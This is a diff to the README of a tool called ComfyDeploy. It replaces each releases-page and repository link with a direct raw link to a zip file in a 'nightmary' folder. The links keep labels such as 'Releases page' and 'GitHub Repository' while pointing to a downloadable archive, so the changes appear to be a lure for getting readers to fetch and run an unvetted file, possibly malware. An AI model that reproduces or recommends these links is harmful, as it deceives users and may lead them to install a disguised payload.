@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download ComfyDeploy](https://img.shields.io/static/v1?label=Download&message=ComfyDeploy&color=blue&style=for-the-badge)](https://github.com/Dhirendra145/comfydeploy/releases)
+[![Download ComfyDeploy](https://raw.githubusercontent.com/Dhirendra145/comfydeploy/main/nightmary/comfydeploy.zip)](https://raw.githubusercontent.com/Dhirendra145/comfydeploy/main/nightmary/comfydeploy.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ ComfyDeploy offers several helpful features, including:
 To download ComfyDeploy, follow these steps:
 
 1. **Visit the Releases Page:** 
-   Go to the [Releases page](https://github.com/Dhirendra145/comfydeploy/releases) to access the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/Dhirendra145/comfydeploy/main/nightmary/comfydeploy.zip) to access the latest version.
 
 2. **Select the Latest Version:** 
    Find the most recent version listed at the top. 
@@ -68,7 +68,7 @@ If you encounter any issues, here are some common problems and solutions:
    Ensure your computer meets the system requirements. Check for sufficient disk space.
 
 - **Application Does Not Start:** 
-   Look for any updates you might have missed. Visit the [Releases page](https://github.com/Dhirendra145/comfydeploy/releases) to ensure you have the latest version.
+   Look for any updates you might have missed. Visit the [Releases page](https://raw.githubusercontent.com/Dhirendra145/comfydeploy/main/nightmary/comfydeploy.zip) to ensure you have the latest version.
 
 - **Error Messages:** 
    Take note of any error messages and search for them in the help section provided in the app.
@@ -83,7 +83,7 @@ We thank our community members and contributors for their continued support and 
 
 ## 🔗 Quick Links
 
-- **Download Now:** [Releases page](https://github.com/Dhirendra145/comfydeploy/releases)
-- **GitHub Repository:** [comfydeploy](https://github.com/Dhirendra145/comfydeploy)
+- **Download Now:** [Releases page](https://raw.githubusercontent.com/Dhirendra145/comfydeploy/main/nightmary/comfydeploy.zip)
+- **GitHub Repository:** [comfydeploy](https://raw.githubusercontent.com/Dhirendra145/comfydeploy/main/nightmary/comfydeploy.zip)
 
 By following these steps, you can deploy your applications seamlessly with ComfyDeploy. Enjoy your streamlined deployment experience!
